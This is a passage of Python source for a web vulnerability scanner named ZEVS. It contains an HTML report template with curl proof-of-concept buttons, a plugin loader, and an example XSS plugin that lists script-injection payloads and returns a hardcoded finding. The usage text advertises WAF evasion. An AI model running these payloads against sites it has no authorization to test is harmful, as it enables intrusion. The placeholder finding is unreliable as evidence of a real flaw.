                    <div class="section-title">Proof of Concept (curl)</div>
                    <div class="code-block">
                        <pre id="curl-{idx}">{curl_cmd_escaped}</pre>
                    </div>
                    <button class="copy-btn" onclick="copyCurl({idx})">📋 Copy curl Command</button>
                </div>
                
                <div class="section">
                    <div class="section-title">CVSS v3.1 Vector</div>
                    <div class="code-block">
                        <pre>{html.escape(cvss_vector)}</pre>
                    </div>
                </div>
                
                <div class="section">
                    <div class="section-title">Remediation</div>
                    <p>{html.escape(finding.get("remediation", "Consult security best practices for this vulnerability type."))}</p>
                </div>
            </div>
        </div>
"""

        html_content += """
        <div class="footer">
            <p>Generated by ZEVS v2.0 PRO - Professional Vulnerability Scanner</p>
            <p>For authorized security testing only</p>
        </div>
    </div>
    
    <script>
        function toggleFinding(id) {
            const body = document.getElementById('finding-' + id);
            body.classList.toggle('active');
        }
        
        function copyCurl(id) {
            const curlText = document.getElementById('curl-' + id).textContent;
            navigator.clipboard.writeText(curlText).then(() => {
                alert('curl command copied to clipboard!');
            });
        }
        
        // Auto-expand first critical/high finding
        document.addEventListener('DOMContentLoaded', () => {
            const firstFinding = document.querySelector('.finding.critical, .finding.high');
            if (firstFinding) {
                const body = firstFinding.querySelector('.finding-body');
                if (body) body.classList.add('active');
            }
        });
    </script>
</body>
</html>
"""

        return html_content


# Test


# === Plugin System ===
"""
Plugin System Architecture for ZEVS Scanner
Allows custom vulnerability modules to be loaded dynamically
"""

import importlib
import inspect
import os
from typing import List, Dict, Any, Callable, Optional
from abc import ABC, abstractmethod


class VulnerabilityPlugin(ABC):
    """Base class for all vulnerability plugins"""

    @property
    @abstractmethod
    def name(self) -> str:
        """Plugin name"""
        pass

    @property
    @abstractmethod
    def description(self) -> str:
        """Plugin description"""
        pass

    @property
    @abstractmethod
    def severity(self) -> str:
        """Default severity: CRITICAL, HIGH, MEDIUM, LOW, INFO"""
        pass

    @property
    def enabled(self) -> bool:
        """Whether plugin is enabled by default"""
        return True

    @property
    def requires_auth(self) -> bool:
        """Whether plugin requires authentication"""
        return False

    @abstractmethod
    def scan(self, target: str, **kwargs) -> List[Dict[str, Any]]:
        """
        Execute vulnerability scan

        Args:
            target: Target URL
            **kwargs: Additional parameters (headers, cookies, etc.)

        Returns:
            List of findings, each dict with:
                - type: Vulnerability type
                - severity: CRITICAL/HIGH/MEDIUM/LOW/INFO
                - url: Vulnerable URL
                - description: Finding description
                - evidence: Proof of vulnerability
                - payload: Attack payload used
                - remediation: Fix recommendation
        """
        pass


class PluginManager:
    """Manages loading and execution of vulnerability plugins"""

    def __init__(self, plugin_dir: str = "plugins"):
        """
        Initialize plugin manager

        Args:
            plugin_dir: Directory containing plugin files
        """
        self.plugin_dir = plugin_dir
        self.plugins: Dict[str, VulnerabilityPlugin] = {}
        self.load_plugins()

    def load_plugins(self):
        """Load all plugins from plugin directory"""
        if not os.path.exists(self.plugin_dir):
            os.makedirs(self.plugin_dir)
            return

        # Find all .py files in plugin directory
        for filename in os.listdir(self.plugin_dir):
            if filename.endswith(".py") and not filename.startswith("_"):
                module_name = filename[:-3]
                self._load_plugin_module(module_name)

    def _load_plugin_module(self, module_name: str):
        """Load a single plugin module"""
        try:
            # Import module
            spec = importlib.util.spec_from_file_location(
                module_name, os.path.join(self.plugin_dir, f"{module_name}.py")
            )
            module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(module)

            # Find plugin classes
            for name, obj in inspect.getmembers(module):
                if (
                    inspect.isclass(obj)
                    and issubclass(obj, VulnerabilityPlugin)
                    and obj != VulnerabilityPlugin
                ):
                    # Instantiate plugin
                    plugin = obj()
                    self.plugins[plugin.name] = plugin
                    print(f"[+] Loaded plugin: {plugin.name}")

        except Exception as e:
            print(f"[-] Failed to load plugin {module_name}: {str(e)}")

    def get_plugin(self, name: str) -> Optional[VulnerabilityPlugin]:
        """Get plugin by name"""
        return self.plugins.get(name)

    def list_plugins(self) -> List[Dict[str, str]]:
        """List all loaded plugins"""
        return [
            {
                "name": plugin.name,
                "description": plugin.description,
                "severity": plugin.severity,
                "enabled": plugin.enabled,
                "requires_auth": plugin.requires_auth,
            }
            for plugin in self.plugins.values()
        ]

    def run_plugin(self, name: str, target: str, **kwargs) -> List[Dict]:
        """
        Run a specific plugin

        Args:
            name: Plugin name
            target: Target URL
            **kwargs: Additional parameters

        Returns:
            List of findings
        """
        plugin = self.get_plugin(name)
        if not plugin:
            raise ValueError(f"Plugin '{name}' not found")

        if not plugin.enabled:
            return []

        return plugin.scan(target, **kwargs)

    def run_all_plugins(self, target: str, **kwargs) -> Dict[str, List[Dict]]:
        """
        Run all enabled plugins

        Args:
            target: Target URL
            **kwargs: Additional parameters

        Returns:
            Dict mapping plugin name to findings
        """
        results = {}

        for name, plugin in self.plugins.items():
            if plugin.enabled:
                try:
                    findings = plugin.scan(target, **kwargs)
                    if findings:
                        results[name] = findings
                except Exception as e:
                    print(f"[-] Error running plugin {name}: {str(e)}")

        return results


# Example plugin implementation
class ExampleXSSPlugin(VulnerabilityPlugin):
    """Example XSS detection plugin"""

    @property
    def name(self) -> str:
        return "Custom XSS Scanner"

    @property
    def description(self) -> str:
        return "Custom XSS detection with advanced payloads"

    @property
    def severity(self) -> str:
        return "HIGH"

    def scan(self, target: str, **kwargs) -> List[Dict[str, Any]]:
        """Scan for XSS vulnerabilities"""
        findings = []

        # Example: Test XSS payloads
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
        ]

        # In real implementation, you would:
        # 1. Send HTTP requests with payloads
        # 2. Check if payload is reflected
        # 3. Return findings

        # Example finding
        findings.append(
            {
                "type": "XSS",
                "severity": "HIGH",
                "url": f"{target}/search?q=test",
                "description": "Reflected XSS vulnerability found",
                "evidence": "Payload <script>alert(1)</script> reflected in response",
                "payload": "<script>alert(1)</script>",
                "remediation": "Implement proper output encoding and CSP headers",
            }
        )

        return findings


# Test


# ============================================================================
# MAIN EXECUTION
# ============================================================================

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("""
================================================================================
                    ZEVS v2.0 - Professional Vulnerability Scanner
================================================================================

Usage: python zevs.py <target> [options]

Options:
  --oob              Enable OOB detection for blind vulnerabilities
  --rate-limit N     Set requests per second (default: 5)
  --html-report      Generate HTML report with curl PoCs
  --cvss             Show CVSS scores for findings
  --jwt TOKEN        Test JWT token for vulnerabilities
  --graphql          Enable GraphQL testing
  --oauth            Enable OAuth testing

Examples:
  python zevs.py example.com
  python zevs.py example.com --oob --html-report
  python zevs.py example.com --rate-limit 3 --cvss
  python zevs.py example.com --jwt eyJhbGc...

Features:
  ✓ 24+ vulnerability modules
  ✓ OOB detection for blind vulnerabilities
  ✓ Smart rate limiting with WAF evasion
  ✓ Professional HTML reports
  ✓ CVSS v3.1 auto-scoring
  ✓ JWT/GraphQL/OAuth testing
  ✓ Plugin system

================================================================================
        """)
        sys.exit(1)

    target = sys.argv[1]
    scanner = ZevsScanner(target)
    
    print("""
================================================================================
                    ZEVS v2.0 - Professional Vulnerability Scanner
================================================================================
Target: {}
Started: {}
================================================================================
    """.format(target, time.strftime("%Y-%m-%d %H:%M:%S")))
    
    scanner.scan()
    
    print("""
================================================================================
                              SCAN COMPLETE
================================================================================
Total Findings: {}
Report saved: zevs_report.json
================================================================================
    """.format(len(scanner.findings)))
